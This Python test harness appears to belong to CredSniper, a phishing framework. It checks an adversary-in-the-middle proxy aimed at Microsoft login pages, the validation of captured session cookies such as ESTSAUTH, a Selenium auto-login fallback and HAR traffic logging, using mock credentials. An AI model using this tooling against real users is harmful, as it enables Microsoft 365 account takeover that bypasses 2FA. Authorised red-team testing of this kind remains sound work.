#!/usr/bin/env python3
"""
CredSniper Test Harness
Automated testing for AiTM proxy and Selenium fallback functionality
"""

import sys
import os
import time
import json
import requests
import threading
import datetime
from typing import Dict, List, Any
import logging

# Add the CredSniper modules to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.aitm_proxy import AiTMManager, AiTMProxy
from modules.office365.office365 import Office365Module

class CredSniperTestHarness:
    """
    Comprehensive test harness for CredSniper AiTM and Selenium functionality
    """
    
    def __init__(self, test_config: dict = None):
        self.test_config = test_config or self._default_config()
        self.results = {
            'timestamp': datetime.datetime.utcnow().isoformat(),
            'tests': [],
            'summary': {}
        }
        
        # Setup logging
        self.logger = logging.getLogger('test_harness')
        self.logger.setLevel(logging.INFO)
        if not self.logger.handlers:
            handler = logging.StreamHandler(sys.stdout)
            formatter = logging.Formatter('[%(asctime)s] TEST: %(message)s')
            handler.setFormatter(formatter)
            self.logger.addHandler(handler)
    
    def _default_config(self) -> dict:
        """Default test configuration"""
        return {
            'test_email': 'test@company.com',
            'test_password': 'TestPassword123!',
            'test_2fa': '123456',
            'proxy_port': 8081,
            'timeout': 30,
            'validate_cookies': True,
            'save_artifacts': True,
            'test_selenium_fallback': True
        }
    
    def log(self, message: str):
        """Unified logging"""
        self.logger.info(message)
    
    def run_all_tests(self) -> dict:
        """Run complete test suite"""
        self.log("Starting CredSniper Test Harness")
        self.log(f"Configuration: {json.dumps(self.test_config, indent=2)}")
        
        # Test 1: AiTM Proxy Basic Functionality
        self.test_aitm_proxy_basic()
        
        # Test 2: AiTM Proxy with Microsoft Endpoints
        self.test_aitm_microsoft_endpoints()
        
        # Test 3: Cookie Validation
        if self.test_config.get('validate_cookies'):
            self.test_cookie_validation()
        
        # Test 4: Office365Module AiTM Integration
        self.test_office365_aitm_integration()
        
        # Test 5: Selenium Fallback
        if self.test_config.get('test_selenium_fallback'):
            self.test_selenium_fallback()
        
        # Test 6: HAR File Generation
        self.test_har_generation()
        
        # Generate summary
        self._generate_summary()
        
        self.log("Test harness completed")
        return self.results
    
    def test_aitm_proxy_basic(self) -> bool:
        """Test basic AiTM proxy functionality"""
        test_name = "AiTM Proxy Basic"
        self.log(f"Running test: {test_name}")
        
        test_result = {
            'name': test_name,
            'start_time': datetime.datetime.utcnow().isoformat(),
            'success': False,
            'details': {},
            'errors': []
        }
        
        try:
            # Create and start proxy
            aitm_manager = AiTMManager()
            result = aitm_manager.start_aitm_attack(
                victim_email=self.test_config['test_email'],
                proxy_port=self.test_config['proxy_port']
            )
            
            if result.get('success'):
                test_result['details']['proxy_started'] = True
                test_result['details']['proxy_url'] = result.get('proxy_url')
                self.log(f"  ✓ Proxy started on {result.get('proxy_url')}")
                
                # Test proxy is responding
                time.sleep(2)
                if aitm_manager.proxy and aitm_manager.proxy.is_running:
                    test_result['details']['proxy_running'] = True
                    self.log(f"  ✓ Proxy is running")
                    
                    # Stop proxy
                    if aitm_manager.stop_aitm_attack():
                        test_result['details']['proxy_stopped'] = True
                        test_result['success'] = True
                        self.log(f"  ✓ Proxy stopped successfully")
                    else:
                        test_result['errors'].append("Failed to stop proxy")
                else:
                    test_result['errors'].append("Proxy not running after start")
            else:
                test_result['errors'].append(f"Failed to start proxy: {result.get('error')}")
                
        except Exception as e:
            test_result['errors'].append(f"Exception: {str(e)}")
        
        test_result['end_time'] = datetime.datetime.utcnow().isoformat()
        self.results['tests'].append(test_result)
        
        status = "✓ PASS" if test_result['success'] else "✗ FAIL"
        self.log(f"  {status}: {test_name}")
        return test_result['success']
    
    def test_aitm_microsoft_endpoints(self) -> bool:
        """Test AiTM proxy with Microsoft-specific configurations"""
        test_name = "AiTM Microsoft Endpoints"
        self.log(f"Running test: {test_name}")
        
        test_result = {
            'name': test_name,
            'start_time': datetime.datetime.utcnow().isoformat(),
            'success': False,
            'details': {},
            'errors': []
        }
        
        try:
            # Test with different Microsoft domains
            domains = [
                'login.microsoftonline.com',
                'login.live.com',
                'account.microsoft.com'
            ]
            
            successful_domains = []
            
            for domain in domains:
                try:
                    proxy = AiTMProxy(target_domain=domain, proxy_port=self.test_config['proxy_port'] + 1)
                    if proxy.start_proxy():
                        successful_domains.append(domain)
                        self.log(f"  ✓ Successfully configured for {domain}")
                        proxy.stop_proxy()
                        time.sleep(1)
                    else:
                        self.log(f"  ✗ Failed to configure for {domain}")
                except Exception as e:
                    self.log(f"  ✗ Error with {domain}: {e}")
            
            test_result['details']['tested_domains'] = domains
            test_result['details']['successful_domains'] = successful_domains
            test_result['success'] = len(successful_domains) > 0
            
        except Exception as e:
            test_result['errors'].append(f"Exception: {str(e)}")
        
        test_result['end_time'] = datetime.datetime.utcnow().isoformat()
        self.results['tests'].append(test_result)
        
        status = "✓ PASS" if test_result['success'] else "✗ FAIL"
        self.log(f"  {status}: {test_name}")
        return test_result['success']
    
    def test_cookie_validation(self) -> bool:
        """Test cookie validation functionality"""
        test_name = "Cookie Validation"
        self.log(f"Running test: {test_name}")
        
        test_result = {
            'name': test_name,
            'start_time': datetime.datetime.utcnow().isoformat(),
            'success': False,
            'details': {},
            'errors': []
        }
        
        try:
            # Create proxy with mock cookies
            aitm_manager = AiTMManager()
            aitm_manager.proxy = AiTMProxy()
            
            # Add mock cookies
            mock_cookies = [
                {
                    'timestamp': datetime.datetime.utcnow().isoformat(),
                    'raw_header': 'ESTSAUTH=test_value; Path=/; HttpOnly; Secure',
                    'parsed': {'name': 'ESTSAUTH', 'value': 'test_value', 'path': '/', 'httponly': True}
                },
                {
                    'timestamp': datetime.datetime.utcnow().isoformat(),
                    'raw_header': 'buid=test_buid; Domain=.microsoft.com',
                    'parsed': {'name': 'buid', 'value': 'test_buid', 'domain': '.microsoft.com'}
                }
            ]
            
            aitm_manager.proxy.captured_data['cookies'] = mock_cookies
            
            # Test validation
            validation_result = aitm_manager.validate_session()
            
            test_result['details']['validation_attempted'] = True
            test_result['details']['validation_result'] = validation_result
            
            # We expect this to fail since the cookies are fake, but the mechanism should work
            if 'error' not in validation_result or validation_result.get('valid') == False:
                test_result['success'] = True
                self.log(f"  ✓ Cookie validation mechanism working (expected invalid result)")
            else:
                test_result['errors'].append("Cookie validation mechanism failed")
                
        except Exception as e:
            test_result['errors'].append(f"Exception: {str(e)}")
        
        test_result['end_time'] = datetime.datetime.utcnow().isoformat()
        self.results['tests'].append(test_result)
        
        status = "✓ PASS" if test_result['success'] else "✗ FAIL"
        self.log(f"  {status}: {test_name}")
        return test_result['success']
    
    def test_office365_aitm_integration(self) -> bool:
        """Test Office365Module AiTM integration"""
        test_name = "Office365 AiTM Integration"
        self.log(f"Running test: {test_name}")
        
        test_result = {
            'name': test_name,
            'start_time': datetime.datetime.utcnow().isoformat(),
            'success': False,
            'details': {},
            'errors': []
        }
        
        try:
            # Create Office365Module with AiTM enabled
            module = Office365Module(enable_2fa=True, use_aitm_proxy=True)
            
            test_result['details']['aitm_enabled'] = module.use_aitm_proxy
            test_result['details']['attack_mode'] = module.attack_mode
            test_result['details']['aitm_manager_created'] = module.aitm_manager is not None
            
            # Test API endpoints
            api_tests = {
                'aitm_status': False,
                'aitm_start': False,
                'aitm_results': False
            }
            
            # Mock Flask request context for testing
            class MockRequest:
                def __init__(self):
                    self.values = {'email': 'test@company.com'}
            
            # Simulate status check
            try:
                status_result = module.aitm_status()
                if status_result and 'aitm_enabled' in status_result:
                    api_tests['aitm_status'] = True
                    self.log(f"  ✓ AiTM status API working")
            except Exception as e:
                self.log(f"  ✗ AiTM status API failed: {e}")
            
            test_result['details']['api_tests'] = api_tests
            test_result['success'] = all([
                module.use_aitm_proxy,
                module.aitm_manager is not None,
                api_tests['aitm_status']
            ])
            
        except Exception as e:
            test_result['errors'].append(f"Exception: {str(e)}")
        
        test_result['end_time'] = datetime.datetime.utcnow().isoformat()
        self.results['tests'].append(test_result)
        
        status = "✓ PASS" if test_result['success'] else "✗ FAIL"
        self.log(f"  {status}: {test_name}")
        return test_result['success']
    
    def test_selenium_fallback(self) -> bool:
        """Test Selenium fallback mechanism"""
        test_name = "Selenium Fallback"
        self.log(f"Running test: {test_name}")
        
        test_result = {
            'name': test_name,
            'start_time': datetime.datetime.utcnow().isoformat(),
            'success': False,
            'details': {},
            'errors': []
        }
        
        try:
            # Test with AiTM disabled (should use Selenium)
            module = Office365Module(enable_2fa=True, use_aitm_proxy=False)
            
            test_result['details']['aitm_disabled'] = not module.use_aitm_proxy
            test_result['details']['has_selenium_method'] = hasattr(module, '_selenium_fallback')
            test_result['details']['has_perform_automated_login'] = hasattr(module, 'perform_automated_login')
            
            # Check if Selenium dependencies are available
            try:
                from selenium import webdriver
                test_result['details']['selenium_available'] = True
                self.log(f"  ✓ Selenium dependencies available")
            except ImportError:
                test_result['details']['selenium_available'] = False
                self.log(f"  ✗ Selenium dependencies missing")
            
            test_result['success'] = all([
                not module.use_aitm_proxy,
                hasattr(module, '_selenium_fallback'),
                hasattr(module, 'perform_automated_login')
            ])
            
        except Exception as e:
            test_result['errors'].append(f"Exception: {str(e)}")
        
        test_result['end_time'] = datetime.datetime.utcnow().isoformat()
        self.results['tests'].append(test_result)
        
        status = "✓ PASS" if test_result['success'] else "✗ FAIL"
        self.log(f"  {status}: {test_name}")
        return test_result['success']
    
    def test_har_generation(self) -> bool:
        """Test HAR file generation"""
        test_name = "HAR Generation"
        self.log(f"Running test: {test_name}")
        
        test_result = {
            'name': test_name,
            'start_time': datetime.datetime.utcnow().isoformat(),
            'success': False,
            'details': {},
            'errors': []
        }
        
        try:
            # Create proxy and add some mock traffic
            proxy = AiTMProxy()
            
            # Add mock traffic data
            mock_traffic = [
                {
                    'type': 'request',
                    'data': {
                        'timestamp': datetime.datetime.utcnow().isoformat(),
                        'method': 'GET',
                        'url': 'https://login.microsoftonline.com/',
                        'headers': {'User-Agent': 'Test'},
                        'body': ''
                    }
                },
                {
                    'type': 'response',
                    'data': {
                        'timestamp': datetime.datetime.utcnow().isoformat(),
                        'status_code': 200,
                        'headers': {'Content-Type': 'text/html'},
                        'body': '<html>Test</html>'
                    }
                }
            ]
            
            proxy.traffic_log = mock_traffic
            
            # Test HAR file generation
            har_path = f'/tmp/test_har_{int(time.time())}.har'
            success = proxy.save_har_file(har_path)
            
            test_result['details']['har_generation_attempted'] = True
            test_result['details']['har_path'] = har_path
            test_result['details']['har_file_created'] = os.path.exists(har_path)
            
            if success and os.path.exists(har_path):
                # Verify HAR file structure
                try:
                    with open(har_path, 'r') as f:
                        har_data = json.load(f)
                    
                    test_result['details']['har_valid_json'] = True
                    test_result['details']['har_has_log'] = 'log' in har_data
                    test_result['details']['har_has_entries'] = 'entries' in har_data.get('log', {})
                    
                    test_result['success'] = all([
                        success,
                        os.path.exists(har_path),
                        'log' in har_data,
                        'entries' in har_data.get('log', {})
                    ])
                    
                    self.log(f"  ✓ HAR file generated and valid: {har_path}")
                    
                    # Clean up
                    if self.test_config.get('save_artifacts', False):
                        self.log(f"  📁 HAR file saved for inspection: {har_path}")
                    else:
                        os.remove(har_path)
                        
                except json.JSONDecodeError:
                    test_result['errors'].append("HAR file is not valid JSON")
                except Exception as e:
                    test_result['errors'].append(f"Error reading HAR file: {e}")
            else:
                test_result['errors'].append("HAR file generation failed")
                
        except Exception as e:
            test_result['errors'].append(f"Exception: {str(e)}")
        
        test_result['end_time'] = datetime.datetime.utcnow().isoformat()
        self.results['tests'].append(test_result)
        
        status = "✓ PASS" if test_result['success'] else "✗ FAIL"
        self.log(f"  {status}: {test_name}")
        return test_result['success']
    
    def _generate_summary(self):
        """Generate test summary"""
        total_tests = len(self.results['tests'])
        passed_tests = sum(1 for test in self.results['tests'] if test['success'])
        failed_tests = total_tests - passed_tests
        
        self.results['summary'] = {
            'total_tests': total_tests,
            'passed': passed_tests,
            'failed': failed_tests,
            'success_rate': (passed_tests / total_tests * 100) if total_tests > 0 else 0,
            'overall_success': failed_tests == 0
        }
        
        self.log(f"\n📊 Test Summary:")
        self.log(f"  Total Tests: {total_tests}")
        self.log(f"  Passed: {passed_tests}")
        self.log(f"  Failed: {failed_tests}")
        self.log(f"  Success Rate: {self.results['summary']['success_rate']:.1f}%")
        
        if self.results['summary']['overall_success']:
            self.log(f"  🎉 All tests passed!")
        else:
            self.log(f"  ⚠️  Some tests failed - check details above")
    
    def save_results(self, filepath: str) -> bool:
        """Save test results to file"""
        try:
            with open(filepath, 'w') as f:
                json.dump(self.results, f, indent=2)
            self.log(f"📄 Test results saved to: {filepath}")
            return True
        except Exception as e:
            self.log(f"❌ Failed to save results: {e}")
            return False


def main():
    """Main test runner"""
    import argparse
    
    parser = argparse.ArgumentParser(description='CredSniper Test Harness')
    parser.add_argument('--config', help='JSON config file path')
    parser.add_argument('--output', help='Output file for results', default='test_results.json')
    parser.add_argument('--email', help='Test email address', default='test@company.com')
    parser.add_argument('--password', help='Test password', default='TestPassword123!')
    parser.add_argument('--port', help='Proxy port for testing', type=int, default=8081)
    parser.add_argument('--no-selenium', help='Skip Selenium fallback tests', action='store_true')
    parser.add_argument('--no-validate', help='Skip cookie validation tests', action='store_true')
    parser.add_argument('--save-artifacts', help='Save test artifacts', action='store_true')
    
    args = parser.parse_args()
    
    # Load config
    if args.config:
        try:
            with open(args.config, 'r') as f:
                test_config = json.load(f)
        except Exception as e:
            print(f"Error loading config: {e}")
            return 1
    else:
        test_config = {
            'test_email': args.email,
            'test_password': args.password,
            'test_2fa': '123456',
            'proxy_port': args.port,
            'timeout': 30,
            'validate_cookies': not args.no_validate,
            'save_artifacts': args.save_artifacts,
            'test_selenium_fallback': not args.no_selenium
        }
    
    # Run tests
    harness = CredSniperTestHarness(test_config)
    results = harness.run_all_tests()
    
    # Save results
    harness.save_results(args.output)
    
    # Return appropriate exit code
    return 0 if results['summary']['overall_success'] else 1


if __name__ == "__main__":
    sys.exit(main())